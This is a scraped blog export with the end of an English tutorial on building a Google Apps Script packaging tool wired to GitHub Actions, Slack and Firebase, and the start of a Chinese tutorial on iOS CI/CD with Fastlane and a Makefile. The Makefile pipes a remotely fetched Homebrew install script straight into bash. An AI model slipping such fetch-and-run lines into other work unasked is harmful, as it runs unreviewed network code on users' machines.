initialization. GitHub.gs: GitHub API operation encapsulation. Slack.gs: Slack API operation encapsulation. Firebase.gs: Firebase — App Distribution API operation encapsulation.Building Your Own Packaging Platform Create a Google Apps Script project, and name it.Go to project settings → check “Show ‘appsscript.json’ manifest file in editor” to make the “appsscript.json” metadata file appear. Refer to my open-source project files, create all files according to the example, and copy the content over. It’s silly, but there’s no choice; GAS does not support Git version control. Copy StubData.gs over first; it can be used for the initial deployment test.After copying, it will look exactly like the example project. Deploy the “Web App” for the first time to check the results.In the upper right corner of the project, click “Deploy” → “New deployment” → Type “Web App”:Execution Identity: I always use your account identity to run the script. Users accessing the web app will run the script as the currently logged-in Google account user.Who can access: Only myself. XXX All users in the same organization only users from the same organization + logged-in Google account users can access. All logged-in Google account users all logged-in Google account users can access. Everyone no need to log in to a Google account; everyone can access publicly. If it’s an internal tool: you can choose “ Who can access: XXX All users in the same organization” + “Execution identity: Users accessing the web app” for security control.After completing the deployment, the “Web App” URL will be your web app packaging tool URL, which you can share with team members for use. (The URL is quite ugly; you can use a URL shortening service to wrap it up, updating the deployment content will not change the URL.)Users need to consent to authorization for the first use.Web App Authorization and Deployment GuideThe first time you click the Web App URL, you need to agree to the authorization. Review Permission → Choose the account you want to use for this Web App Unverified warning window, click “Advanced” to expand → Click “Go to ‘XXX’ (unsafe)” Click “Allow” After this, if the script permissions remain unchanged, you do not need to reauthorize.Once authorization is complete, you will enter the homepage of the packaging tool: Demo packaging tool deployed successfully 🎉🎉🎉Note: The message “This application was created by a user of Google Apps Script” cannot be automatically hidden.Update Deployment ⚠️ All code changes require an update deployment to take effect. ⚠️ All code changes require an update deployment to take effect. ⚠️ All code changes require an update deployment to take effect.Please note that code changes saved will not directly affect the Web App, so if you find that refreshing has no effect, this is the reason; You need to go to “Deploy” → “Manage Deployments” → “Edit” → Version “Create New Version” → Click “Deploy” → “Done”. After updating the deployment, refreshing the webpage will show the changes taking effect.Add Test Deployment for Easier DevelopmentAs mentioned earlier, all changes must be updated in the deployment to take effect; this can be very cumbersome during the development phase. Therefore, during development, we can use “Test Deployment” to quickly verify if changes are correct.Go to “Deploy” → “Test Deployment” → Get the test “Web Application” URL.During the development phase, we can directly use this URL to save changes. After saving the file changes, return to this development URL and refresh the webpage to see the results! Once development is complete, update the deployment as mentioned earlier to release it for user use.Modify Demo Example Project to Connect Real DataNext is the key point, connecting real data. The GitHub Actions Workflow refers to the CI/CD process established in the previous article, and you can adjust parameters according to your actual Actions Workflow.⚠️ Please Note Before ModifyingThe Google Apps Script platform does not support multi-user or even multiple window development very well. I have personally encountered issues when I accidentally opened two editing windows; after editing in A, I later edited in B, causing the changes to be overwritten by the old version in B. Therefore, it is recommended that only one person edits the Script in one window at a time.GitHub IntegrationInput GitHub API Token:GitHub → Account → Settings → Developer Settings → Fine-grained personal access tokens or Personal access tokens (classic).It is recommended to use Fine-grained personal access tokens for better security (but they have an expiration).The permissions required for Fine-grained personal access tokens are as follows: Repo: Remember to select the Repo you want to operate on Permissions: Actions (read/write), Administration (read only) If you do not want to rely on someone else’s account, it is recommended to create a clean team GitHub account and use its Token.Go to the GAS project → Credentials.gs → Input the Token into the githubToken variable.Replace GithubStub with GitHub:Go to the GAS project → Settings.gs → Change:const iOSGitHub = new GitHubStub(githubToken, iOSRepoPath);Toconst iOSGitHub = new GitHub(githubToken, iOSRepoPath);Save the file.Refresh the test “Web Application” URL to check if the changes are correct: If the data displays correctly, it means: GitHub has successfully connected to real data 🎉🎉🎉You can also easily switch to “Runner Status” to check if the Self-hosted Runner is functioning properly:Note: My Runner is not running… so it is offline.Slack IntegrationTo integrate Slack notifications, we first need to return to the Repo → GitHub Actions and add a notification container Action for the packaging Action Workflow.CD-Deploy-Form.yml:# Workflow(Action) namename: CD-Deploy-Form# Actions Log titlerun-name: \"[CD-Deploy-Form] ${{ github.ref }}\"# If there is a new Job in the same Concurrency Group, it will cancel the running one# For example, if the same branch's packaging task is triggered repeatedly, it will cancel the previous taskconcurrency: group: ${{ github.workflow }}-${{ github.ref }} cancel-in-progress: true# Trigger eventson: # Manual form trigger workflow_dispatch: # Form Inputs fields inputs: # App version number VERSION_NUMBER: description: 'Version Number of the app (e.g., 1.0.0). Auto-detect from the Xcode project if left blank.' required: false type: string # App Build Number BUILD_NUMBER: description: 'Build number of the app (e.g., 1). Will use a timestamp if left blank.' required: false type: string # App Release Note RELEASE_NOTE: description: 'Release notes of the deployment.' required: false type: string # Triggerer's Slack User ID SLACK_USER_ID: description: 'Slack user id.' required: true type: string # Triggerer's Email AUTHOR: description: 'Trigger author email.' required: true type: string # Job tasksjobs: # Send Slack message when packaging starts # Job ID start-message: # Small tasks run directly on GitHub Hosted Runner, not resource-intensive runs-on: ubuntu-latest # Set maximum timeout duration to prevent endless waiting in case of abnormal situations # Normally, it should not take more than 5 minutes timeout-minutes: 5 # Job steps steps: - name: Post a Start Slack Message id: slack uses: slackapi/slack-github-action@v2.0.0 with: method: chat.postMessage token: ${{ secrets.SLACK_BOT_TOKEN }} payload: | channel: ${{ inputs.SLACK_USER_ID }} text: \"Received packaging request.\\nID: &lt;${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}|${{ github.run_id }}&gt;\\nBranch: ${{ github.ref_name }}\\ncc'ed &lt;@${{ inputs.SLACK_USER_ID }}&gt;\" # Job Output for subsequent Jobs to use # ts = Slack message ID, so subsequent notifications can Reply in the same Threads outputs: ts: ${{ steps.slack.outputs.ts }} deploy: # Jobs are executed concurrently by default; use needs to wait for start-message to complete before executing # Execute packaging deployment task needs: start-message uses: ./.github/workflows/CD-Deploy.yml secrets: inherit with: VERSION_NUMBER: ${{ inputs.VERSION_NUMBER }} BUILD_NUMBER: ${{ inputs.BUILD_NUMBER }} RELEASE_NOTE: ${{ inputs.RELEASE_NOTE }} AUTHOR: ${{ inputs.AUTHOR }} # Success message for packaging deployment task end-message-success: needs: [start-message, deploy] if: ${{ needs.deploy.result == 'success' }} runs-on: ubuntu-latest timeout-minutes: 5 steps: - name: Post a Success Slack Message uses: slackapi/slack-github-action@v2.0.0 with: method: chat.postMessage token: ${{ secrets.SLACK_BOT_TOKEN }} payload: | channel: ${{ inputs.SLACK_USER_ID }} thread_ts: \"${{ needs.start-message.outputs.ts }}\" text: \"✅ Packaging deployment successful.\\n\\ncc'ed &lt;@${{ inputs.SLACK_USER_ID }}&gt;\" # Failure message for packaging deployment task end-message-failure: needs: [deploy, start-message] if: ${{ needs.deploy.result == 'failure' }} runs-on: ubuntu-latest timeout-minutes: 5 steps: - name: Post a Failure Slack Message uses: slackapi/slack-github-action@v2.0.0 with: method: chat.postMessage token: ${{ secrets.SLACK_BOT_TOKEN }} payload: | channel: ${{ inputs.SLACK_USER_ID }} thread_ts: \"${{ needs.start-message.outputs.ts }}\" text: \"❌ Packaging deployment failed, please check the execution status or try again later.\\n\\ncc'ed &lt;@${{ inputs.SLACK_USER_ID }}&gt;\" # Cancelled message for packaging deployment task end-message-cancelled: needs: [deploy, start-message] if: ${{ needs.deploy.result == 'cancelled' }} runs-on: ubuntu-latest timeout-minutes: 5 steps: - name: Post a Cancelled Slack Message uses: slackapi/slack-github-action@v2.0.0 with: method: chat.postMessage token: ${{ secrets.SLACK_BOT_TOKEN }} payload: | channel: ${{ inputs.SLACK_USER_ID }} thread_ts: \"${{ needs.start-message.outputs.ts }}\" text: \":black_square_for_stop: Packaging deployment has been cancelled.\\n\\ncc'ed &lt;@${{ inputs.SLACK_USER_ID }}&gt;\"Complete Code: CD-Deploy-Form.ymlThis Action is just a container that connects to Slack notifications; it actually reuses the CD-Deploy.yml Action written in the previous article. For creating a Slack Bot App and setting message permissions, you can refer to my previous article. Remember to go to Repo → Secrets to add the corresponding SLACK_BOT_TOKEN and input the Slack Bot App Token value.Return to the GAS project → Credentials.gs → Input the Token into the slackBotToken variable.Then go to the GAS project → Settings.gs → Change:const slack = new SlackStub(slackBotToken);Toconst slack = new Slack(slackBotToken);Save the file. If you do not have an existing Slack Bot App to send notifications and do not want to create one, you can skip all these steps and remove any Slack-related usage in the GAS project.GitHub Integration — Packaging FormGo to the GAS project → Controller_iOS.gs → Adjust the content of View_iOS_Form.html:Remove the fake Asana Tasks connection method: &lt;? tasks.forEach(function(task) { ?&gt; &lt;option value=\"&lt;?=task.githubBranch?&gt;\"&gt;[&lt;?=task.id?&gt;] &lt;?=task.title?&gt;&lt;/option&gt; &lt;? }) ?&gt;You can also adjust the default branch here (this is main).—Go to the GAS project → Controller_iOS.gs → Adjust the content of iOSLoadForm(): Remove the line template.tasks = Stubable.fetchStubAsanaTasks(); which is a fake connection to Asana.If you want to connect to Asana/Jira, you can directly ask ChatGPT to help you create the connection method. template.prs = iOSGitHub.fetchOpenPRs(); is the actual connection to the GitHub API to get the Opened PR List, which you can keep as needed.Processing After Submission in iOSSubmitForm() content:You can adjust according to the actual GitHub Actions Workflow file name and workflow_dispatch input parameters: iOSGitHub.dispatchWorkflow(\"CD-Deploy-Form.yml\", branch, { \"BUILD_NUMBER\": buildNumber, \"VERSION_NUMBER\": versionNumber, \"VERSION_NUMBER\": versionNumber, \"RELEASE_NOTE\": releaseNote, \"AUTHOR\": email, \"SLACK_USER_ID\": slack.fetchUserID(email) });You can also add your own required validation; here it only validates that the branch must be filled in, otherwise, it will throw an error message.If you think this is not secure enough, you can add password verification or restrict usage to specific accounts. The last line Slack notification functionality requires proper Slack setup. If you do not have a Slack Bot App or do not want to connect to Slack, you can directly use iOSGitHub.dispatchWorkflow(\"CD-Deploy.yml\") in the Demo Actions Repo and remove the SLACK_USER_ID parameter.Refresh the test “Web Application” URL to check if the changes are correct:You can see that the packaging form now only has the Opened PR List.Fill in the data and click “Submit Request” to test the packaging form:A successful submission prompt indicates no issues, and you can also see the task starting to execute in the packaging records 🎉: Repeatedly clicking on the packaging records can update the progress.Common Submission Errors: Required input ‘SLACK_USER_ID’ not provided : The SLACK_USER_ID field in GitHub Actions is required, but it was not provided. This may be due to a failed Slack setup or the current User Email not matching a corresponding Slack UID. Workflow does not have ‘workflow_dispatch’ trigger, Branch is outdated, please update xxx branch: The selected branch cannot find the corresponding Action Workflow file (the file specified in iOSGitHub.dispatchWorkflow). No ref found for, Branch not found: This branch cannot be found.Firebase App Distribution — Obtain Download Link IntegrationThe last small feature is to integrate Firebase App Distribution to directly obtain download information and links, making it convenient to click and download/install directly from the packaging platform tool on mobile. Previously introduced in “Google Apps Script x Google APIs Quick Integration Method”, GAS can quickly and painlessly integrate with Firebase.Integration Principle Before integration, let me explain this “Tricky” integration principle.Our packaging platform does not have a database; it purely acts as an API relay station. Therefore, during the packaging operation in GitHub Actions CD-Deploy.yml, we pass the Job Run ID into the Release Note (it can also be passed into the Build Number):ID=\"${{ github.run_id }}\" // Job Run IDCOMMIT_SHA=\"${{ github.sha }}\"BRANCH_NAME=\"${{ github.ref_name }}\"AUTHOR=\"${{ env.AUTHOR }}\"# Combine Release NoteRELEASE_NOTE=\"${{ env.RELEASE_NOTE }}ID: ${ID}Commit SHA: ${COMMIT_SHA}Branch: ${BRANCH_NAME}Author: ${AUTHOR}\"# Execute Fastlane packaging &amp; deployment Lanebundle exec fastlane beta release_notes:\"${RELEASE_NOTE}\" version_number:\"${VERSION_NUMBER}\" build_number:\"${BUILD_NUMBER}\"This way, the Firebase App Distribution Release Notes will contain the Job Run ID.The GAS Web App packaging tool platform will connect to the GitHub API to obtain the GitHub Actions execution records, and we can directly use the API-provided Job Run ID to query the Firebase App Distribution API for versions that include *ID: XXX* in the Release Notes, allowing us to find the corresponding packaging records.You can achieve the correspondence between two tool platforms without any database.Project Setup for IntegrationGo to GAS → Project Settings → Google Cloud Platform (GCP) Project → Change Project:Enter the Firebase project number you want to integrate. The initial setup may show an error “To change the project, please set up the OAuth consent screen. Details for setting up the OAuth consent screen.” If you don’t have this, you can skip the following steps.Click on the “OAuth consent screen details” link → Click “Configure consent screen”:Click “Get Started”:Application Information: Application Name: Enter your tool name User Support Email: Select emailTarget Audience: Internal: Only for use by partners within the organization External: All Google account users can use it after consenting to authorizationContact Information: Enter an email for receiving notificationsCheck the consent for the Google API Services: User Data Policy .Finally, click “Create”.—Return to GAS → Project Settings → Google Cloud Platform (GCP) Project → Change Project:Re-enter the Firebase project number and click “Change Project”.If no errors appear, the binding is complete.—If you selected “External,” you may need to complete the following settings:Click on “Project Number” → Expand the left sidebar → “APIs &amp; Services” → “OAuth consent screen”Select “Target Audience” → Test Click “Publish App” → Done. Users can complete the authorization following the previous step of “User consent required for first-time use” and start using it!If the above steps are not set, users will encounter the following error:Access blocked “XXX” not completed Google verification process— — —Integration ProjectReturning to the integration, Firebase directly uses ScriptApp.getOAuthToken() to dynamically obtain the Token based on the execution identity, so there is no need to set the Token.Just go to the GAS project → Settings.gs → Change:const iOSFirebase = new FirebaseStub(iOSFirebaseProject);Toconst iOSFirebase = new Firebase(iOSFirebaseProject);And that’s it.Refresh the test “Web Application” URL to the build record → Find a record and click “Get Download Link”:If you find the corresponding Job Run Id in the Firebase App Distribution Release Notes, it will directly display the download information, and clicking download will take you to the download page. Done! 🎉🎉🎉ResultsAt this point, you have modified the examples into your actual usable packaging tool. The remaining custom features, more third-party API integrations, and additional forms can be extended by yourself (discuss with ChatGPT). Finally, don’t forget that after all development and testing are completed, you need to go online, following the previous steps — update the deployment operation for it to take effect!Integration ExtensionsContinuing with our “relay station” role, here are a few quick integration CheatSheets:Asana API — Get Tasks:function asanaAPI(endPoint, method = \"GET\", data = null) { var options = { \"method\" : method, \"headers\": { \"Authorization\": \"Bearer \"+asanaToken }, \"payload\" : data }; var url = \"https://app.asana.com/api/1.0\"+endPoint; var res = UrlFetchApp.fetch(url, options); var data = JSON.parse(res.getContentText()); return data;}asanaAPI(\"/projects/{project_gid}/tasks\")Jira API — Get Tickets (JQL):// jql = filter criteriafunction jiraTickets(jql) { const url = `https://xxx.atlassian.net/rest/api/3/search`; const maxResults = 100; let allIssues = []; let startAt = 0; let total = 0; do { const queryParams = { jql: jql, startAt: startAt, maxResults: maxResults, fields: \"assignee,summary,status\" }; const queryString = Object.keys(queryParams) .map(key =&gt; `${encodeURIComponent(key)}=${encodeURIComponent(queryParams[key])}`) .join(\"&amp;\"); const options = { method: \"get\", headers: { Authorization: \"Basic \" + jiraToken, \"Content-Type\": \"application/json\", }, muteHttpExceptions: true, }; const response = UrlFetchApp.fetch(`${url}?${queryString}`, options); const json = JSON.parse(response.getContentText()); if (response.getResponseCode() != 200) { throw new Error(\"Failed to fetch Jira issues.\"); } if (json.issues &amp;&amp; json.issues.length &gt; 0) { allIssues = allIssues.concat(json.issues); total = json.total; startAt += json.issues.length; } else { break; } } while (startAt &lt; total); var groupIssues = {}; for(var i = 0; i &lt; allIssues.length; i++) { const issue = allIssues[i]; if (groupIssues[issue.fields.status.name] == null) { groupIssues[issue.fields.status.name] = []; } groupIssues[issue.fields.status.name].push(issue); } return groupIssues;}jiraTickets(`project IN(App)`);If you really need a database, you can use Google Sheets instead:class Saveable { constructor(type) { // https://docs.google.com/spreadsheets/d/Sheet-ID/edit const spreadsheet = SpreadsheetApp.openById(\"Sheet-ID\"); this.sheet = spreadsheet.getSheetByName(\"Data\"); // Sheet Name this.type = type; } write(key, value) { this.sheet.appendRow([ this.type, key, JSON.stringify(value) ]); } read(key) { const data = this.sheet.getDataRange().getValues(); const row = data.find(r =&gt; r[0] === this.type &amp;&amp; r[1] === key); if (row) { return JSON.parse(row[2]); } return null; }}let saveable = Saveable(\"user\");// Writesaveable.write(\"birthday_zhgchgli\", \"0718\");// Readsaveable.read(\"birthday_zhgchgli\"); // -&gt; 0718Slack API &amp; Sending Messages:function slackSendMessage(channel, text = \"\", blocks = null) { const content = { channel: channel, unfurl_links: false, unfurl_media: false, text: text, blocks: blocks }; try { const response = slackRequest(\"chat.postMessage\", content); return response; } catch (error) { throw new Error(`Failed to send Slack message: ${error}`); }}function slackRequest(path, content) { const options = { method: \"post\", contentType: \"application/json\", headers: { Authorization: `Bearer ${slackBotToken}`, 'X-Slack-No-Retry': 1 }, payload: JSON.stringify(content) }; try { const response = UrlFetchApp.fetch(\"https://slack.com/api/\"+path, options); const responseData = JSON.parse(response.getContentText()); if (responseData.ok) { return responseData } else { throw new Error(`Slack: ${responseData.error}`); } } catch (error) { throw error; }}More Google Apps Script Examples: Quick Integration Methods for Google Apps Script x Google APIs Simple 3 Steps — Create a Free GA4 Automatic Data Notification Bot Automate Daily Data Reports RPA Using Google Apps Script Slack &amp; ChatGPT Integration Free GitHub Repo Star Notifier in Three Steps Using Google Apps Script Crashlytics + Google Analytics Automatic Query for App Crash-Free Users Rate Crashlytics + Big Query to Create a More Real-Time Convenient Crash Tracking ToolSummaryThank you for your patience in reading and participating. This series of articles on CI/CD from 0 to 1 comes to a close; I hope it can genuinely help you and your team build a robust CI/CD workflow, enhancing efficiency and product stability. If you have any implementation questions, feel free to leave a comment. These four articles took about 14+ days to write, if you found it helpful, please follow my Medium and share it with friends and colleagues. Thank you.Buy me a coffee This series of articles took a significant amount of time and effort to write. If the content has helped you or your team improve work efficiency and product quality, feel free to buy me a coffee as a token of appreciation!Buy me a coffeeSeries Articles: CI/CD Practical Guide (1): What is CI/CD? How to Build a Stable and Efficient Development Team through CI/CD? Tool Selection? CI/CD Practical Guide (2): Comprehensive Guide to Using GitHub Actions and Self-Hosted Runners CI/CD Practical Guide (3): Implementing CI and CD Workflows for App Projects Using GitHub Actions CI/CD Practical Guide (4): Using Google Apps Script Web App to Integrate GitHub Actions to Build a Free and Easy-to-Use Packaging Tool PlatformIf you have any questions or suggestions, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 84 Total Views Last Statistics Date: 2025-08-15 | 72 Views on Medium." }, { "title": "CI/CD 實戰指南（三）：使用 GitHub Actions 實作 App iOS CI 與 CD 工作流程", "url": "/posts/zrealm-dev/ci-cd-%E5%AF%A6%E6%88%B0%E6%8C%87%E5%8D%97-%E4%B8%89-%E4%BD%BF%E7%94%A8-github-actions-%E5%AF%A6%E4%BD%9C-app-ios-ci-%E8%88%87-cd-%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B-4b001d2e8440/", "categories": "ZRealm Dev.", "tags": "ios-app-development, cicd, github-actions, firebase, cicd-pipeline", "date": "2025-07-07 23:02:24 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.CI/CD 實戰指南（三）：使用 GitHub Actions 實作 App iOS CI 與 CD 工作流程iOS App 自動化建置、測試、部署的 GitHub Actions 實作步驟完整教學Photo by Robs前...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.CI/CD 實戰指南（三）：使用 GitHub Actions 實作 App iOS CI 與 CD 工作流程iOS App 自動化建置、測試、部署的 GitHub Actions 實作步驟完整教學Photo by Robs前言前篇「 CI/CD 實戰指南（二）：GitHub Actions 與 Self-hosted Runner 使用與建置大全 」我們介紹了 GitHub Actions 的基礎知識與運作流程還有如何使用自己的機器當成 Runner、帶大家實現了三個簡單的自動化 Actions； 本篇將深入著重在現實使用 GitHub Actions 建置 App (iOS) CI/CD 工作流程上 ，一樣手把手帶大家一步一步完成並一邊補足 GitHub Actions 相關知識。App CI/CD 流程關係圖本篇將關注在 GitHub Actions 建置 CI/CD 的區塊，下一篇「 CI/CD 實戰指南（四）：使用 Google Apps Script Web App 串接 GitHub Actions 建置免費易用的打包工具平台 」才會介紹右半部分的使用 Google Apps Script Web App 建置跨團隊協作打包平台。運作流程： GitHub Actions 開 Pull Request 觸發 or 表單觸發 or 定時觸發 執行對應 Workflow Jobs/Steps Step 執行對應 Fastlane (iOS) or (Android Gradle) 腳本 Fastlane 執行對應 xcodebuild (iOS) 指令 取得執行結果 後續 Workflow Jobs/Steps 處理結果 完成GitHub Actions 成果圖先上最終成果給大家一點實作動力！CI TestingCI Nightly Build, CD DeployGitHub Actions x Self-hosted Runner 基礎知識如果你對 GitHub Actions 與架設 Self-hosted Runner 還不熟悉強烈建議先看過上篇「 CI/CD 實戰指南（二）：GitHub Actions 與 Self-hosted Runner 使用與建置大全 」或是搭配上篇知識一起實作。 實作開始！iOS Demo 專案的 Infra 架構本文用到的 iOS 專案內容包含測試項目都是用 AI 產生的 ，不需在意 iOS 的程式細節，只針對 Infra &amp; CI/CD 部分做討論。 以下工具只是憑以往經驗，如果是新專案可以考慮使用更新的 mise 和 tuist 。MintMint 工具可以幫我們統一管理依賴工具的版本(Gemfile 只能管理 Ruby Gems)，例如 XCodeGen、XCodeGen、SwiftFormat、SwiftLint、Periphery…etcMintfile:yonaskolb/Mint@0.17.5yonaskolb/XcodeGen@2.35.0nicklockwood/SwiftFormat@0.51.13這邊我們只用到三個。 覺得太複雜不使用也可以，直接在 Action Workflow Step 中用 brew install 安裝需要的工具即可。BundleGemfile:source 'https://rubygems.org'gem 'cocoapods', '~&gt;1.16.0'gem 'fastlane', '~&gt;2.228.0'plugins_path = File.join(File.dirname(__FILE__), 'Product', 'fastlane', 'Pluginfile')eval_gemfile(plugins_path) if File.exist?(plugins_path)管理 Ruby (Gems) 相關依賴，一般 iOS 專案最常用的就是這兩個 cocoapods 跟 fastlane 。CocoapodsProduct/podfile:platform :ios, '13.0'use_frameworks!target 'app-ci-cd-github-actions-demo' do pod 'SnapKit'end 雖然已宣告 即將停止維護 ，但 Cocoapods 在有年代的 iOS 專案中仍很常見，這邊簡單加一個 Snapkit 當 Demo。XCodeGen避免多人開發中 .xcodeproj / .xcworkspace 異動造成的衝突，統一使用 Project.yaml 定義 XCode Project 內容，然後在本地自己 Gen Project 檔案(不上 Git)。Product/project.yaml:name: app-ci-cd-github-actions-demooptions: bundleIdPrefix: com.example deploymentTarget: iOS: '13.0' usesTabs: false indentWidth: 2 tabWidth: 2configs: Debug: debug Release: releasetargets: app-ci-cd-github-actions-demo: type: application platform: iOS sources: - app-ci-cd-github-actions-demo resources: - app-ci-cd-github-actions-demo/Assets.xcassets - app-ci-cd-github-actions-demo/Base.lproj info: path: app-ci-cd-github-actions-demo/Info.plist properties: CFBundleIdentifier: $(PRODUCT_BUNDLE_IDENTIFIER) settings: base: PRODUCT_BUNDLE_IDENTIFIER: com.test.appcicdgithubactionsdemo cocoapods: true app-ci-cd-github-actions-demoTests: type: bundle.unit-test platform: iOS sources: - app-ci-cd-github-actions-demoTests dependencies: - target: app-ci-cd-github-actions-demo info: path: app-ci-cd-github-actions-demoTests/Info.plist settings: base: PRODUCT_BUNDLE_IDENTIFIER: com.test.appcicdgithubactionsdemo.tests app-ci-cd-github-actions-demoUITests: type: bundle.ui-testing platform: iOS sources: - app-ci-cd-github-actions-demoUITests dependencies: - target: app-ci-cd-github-actions-demo info: path: app-ci-cd-github-actions-demoUITests/Info.plist settings: base: PRODUCT_BUNDLE_IDENTIFIER: com.test.appcicdgithubactionsdemo.uitests app-ci-cd-github-actions-demoSnapshotTests: type: bundle.unit-test platform: iOS sources: - path: app-ci-cd-github-actions-demoSnapshotTests excludes: - \"**/__Snapshots__/**\" dependencies: - target: app-ci-cd-github-actions-demo - product: SnapshotTesting package: SnapshotTesting info: path: app-ci-cd-github-actions-demoSnapshotTests/Info.plist settings: base: PRODUCT_BUNDLE_IDENTIFIER: com.test.appcicdgithubactionsdemo.snapshottestspackages: SnapshotTesting: url: https://github.com/pointfreeco/swift-snapshot-testing from: 1.18.4SnapshotTesting: 使用 Swift Package Manager 管理。Fastlane封裝 xcodebuild 指令、封裝串接 App Store Connect API、Firebase API. .等服務的複雜步驟。Product/fastlane/Fastfile:default_platform(:ios)platform :ios do desc \"Run all tests (Unit Tests + UI Tests)\" lane :run_all_tests do |options| device = options[:device] scan( scheme: \"app-ci-cd-github-actions-demo\", device: device, clean: true, output_directory: \"fastlane/test_output\", output_types: \"junit\" ) end desc \"Run only Unit Tests\" lane :run_unit_tests do |options| device = options[:device] scan( scheme: \"app-ci-cd-github-actions-demo\", device: device, clean: true, only_testing: [ \"app-ci-cd-github-actions-demoTests\" ], output_directory: \"fastlane/test_output\", output_types: \"junit\" ) end desc \"Build and upload to Firebase App Distribution\" lane :beta do |options| if options[:version_number] &amp;&amp; options[:version_number].to_s.strip != \"\" increment_version_number(version_number: options[:version_number]) end if options[:build_number] &amp;&amp; options[:build_number].to_s.strip != \"\" increment_build_number(build_number: options[:build_number]) end update_code_signing_settings( use_automatic_signing: false, path: \"app-ci-cd-github-actions-demo.xcodeproj\", team_id: ENV['TEAM_ID'], code_sign_identity: \"iPhone Developer\", sdk: \"iphoneos*\", profile_name: \"cicd\" ) gym( scheme: \"app-ci-cd-github-actions-demo\", clean: true, export_method: \"development\", output_directory: \"fastlane/build\", output_name: \"app-ci-cd-github-actions-demo.ipa\", export_options: { provisioningProfiles: { \"com.test.appcicdgithubactionsdemo\" =&gt; \"cicd\", }, } ) firebase_app_distribution( app: \"1:127683058219:ios:98896929fa131c7a80686e\", firebase_cli_token: ENV[\"FIREBASE_CLI_TOKEN\"], release_notes: options[:release_notes] || \"New beta build\" ) endend註: provisioningProfiles、profile_name 對應的是 App Developer 中的 Profiles 憑證名稱 。(如果有用 match 則也不需要這些指定。)Fastlane 是 iOS CI/CD 當中不可或缺的一部分 ，直接使用它封裝好的方法就能快速開發 CI/CD 實際執行的步驟；我們只需關注在整體的腳本設計，而不需去處理複雜的 API 串接或指令撰寫。例如：Fastlane 只需要寫「scan(xxx)」就能執行測試，如果要寫成 xcodebuild 則需要「 xcodebuild -workspace ./xxx.xcworkspace -scheme xxx -derivedDataPath xxx ‘platform=iOS Simulator,id=xxx’ clean build test 」，打包部署要自己做更是麻煩，要自行串接 App Store Connect/Firebase API，光金鑰驗證都要寫超過 10 行程式了。Demo 專案我們只有三個 Lane: run_all_tests: 跑所有類型的測試 (Snapshot+Unit) run_unit_tests: 只跑單元測試 (Unit) beta: 打包部署到 Firebase App DistributionFastlane — Match因 Demo 專案限制，這邊沒用到 Match 管理團隊開發、部署憑證，但這邊還是要提一下，建議使用 Match 去管理團隊的所有開發、部署憑證，方便控管跟統一更新。 有用 Match 就能在專案 Setup 步驟直接使用 match all 之類的指令一鍵安裝好所有開發需要的憑證。 Fastlane Match 會使用另一個 Private Repo 管理憑證金鑰，在 GitHub Actions 中需要設定好 SSH Agent 才能 Clone 另一個 Private Repo。 (請參考文末補充)— — —MakefileMakefile讓開發端與 CI/CD 統一都使用 Makefile 執行指令，方便我們封裝同樣的環境、路徑與操作行爲。 經典的案例是有的人使用的是本機安裝的 pod install 有的人則使用的是 Bundel 管理的 bundle exec pod install 如果版本不同就可能產生差異。 覺得太複雜不使用也可以，那就是在 Action Workflow Step 中直接寫要執行的指令即可。Makefile:#!makePRODUCT_FOLDER = ./Product/SHELL := /bin/zsh.DEFAULT_GOAL := installMINT_DIRECTORY := ./mint/export MINT_PATH=$(MINT_DIRECTORY)## 👇 Help function.PHONY: helphelp: @echo \"\" @echo \"📖 可用指令:\" @grep -E '^[a-zA-Z_-]+:.*?## .*$$' $(MAKEFILE_LIST) | \\ awk 'BEGIN {FS = \":.*?## \"}; {printf \" \\033[36m%-20s\\033[0m %s\\n\", $$1, $$2}' @echo \"\"## Setup.PHONY: setupsetup: check-mint ## 安裝 Ruby 和 Mint 依賴 @echo \"🔨 Installing Ruby dependencies...\" bundle config set path 'vendor/bundle' bundle install @echo \"🔨 Installing Mint dependencies...\" mint bootstrap## Install.PHONY: installinstall: XcodeGen PodInstall ## 執行 XcodeGen 和 CocoaPods 安裝.PHONY: XcodeGenXcodeGen: check-mint ## 用 XcodeGen 產生 .xcodeproj @echo \"🔨 Execute XcodeGen\" cd $(PRODUCT_FOLDER) &amp;&amp; \\ mint run yonaskolb/XcodeGen --quiet.PHONY: PodInstallPodInstall: ## 安裝 CocoaPods 依賴 @echo \"📦 Installing CocoaPods dependencies...\" cd $(PRODUCT_FOLDER) &amp;&amp; \\ bundle exec pod install### Mintcheck-mint: check-brew ## 檢查 Mint 是否安裝，沒有就自動安裝 @if ! command -v mint &amp;&gt; /dev/null; then \\ echo \"🔨 Installing mint...\"; \\ brew install mint; \\ fi### Brewcheck-brew: ## 檢查 Homebrew 是否安裝，沒有就自動安裝 @if ! command -v brew &amp;&gt; /dev/null; then \\ echo \"🔨 Installing Homebrew...\"; \\ /bin/bash -c \"$$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"; \\ fi## Format only git swift files.PHONY: formatformat: check-mint ## 格式化 Product/ 下所有 Swift 檔 mint run swiftformat $(PRODUCT_FOLDER)為了避免污染整個系統或其他專案，我們盡可能把 Dependency 套件(e.g. mint, bundle…etc)的路徑都改指定在專案目錄之下 (再搭配 .gitignore 排除)。├── mint (Mint 依賴)│ └── packages├── Product│ ├── app-ci-cd-github-actions-demo│ ├── app-ci-cd-github-actions-demo.xcodeproj│ ├── app-ci-cd-github-actions-demo.xcworkspace│ ├── app-ci-cd-github-actions-demoSnapshotTests│ ├── app-ci-cd-github-actions-demoTests│ ├── app-ci-cd-github-actions-demoUITests│ ├── fastlane│ └── Pods (Cocoapods 依賴)└── vendor (Bundle 依賴) └── bundlemake help使用 Makefine 的統一專案 Setup 步驟： git clone repo cd ./repo make setup 安裝必要的工具依賴 ( brew , mint , bundle , xcodegen, swiftformat,…) make install 產生專案 (執行 pod install, xcodegen) 完成 打開、執行專案 不管是 CI/CD 或新人 onboard 都是照以上步驟把專案建置起來。本篇 GitHub Actions CI/CD 案例本篇會介紹三個 GitHub Actions CI/CD 工作流程建置案例，大家也可以參考其中的步驟建置符合自己團隊工作流程的 CI/CD。 CI — 發 Pull Request 執行單元測試 CD — 打包+部署到 Firebase App Distribution CI 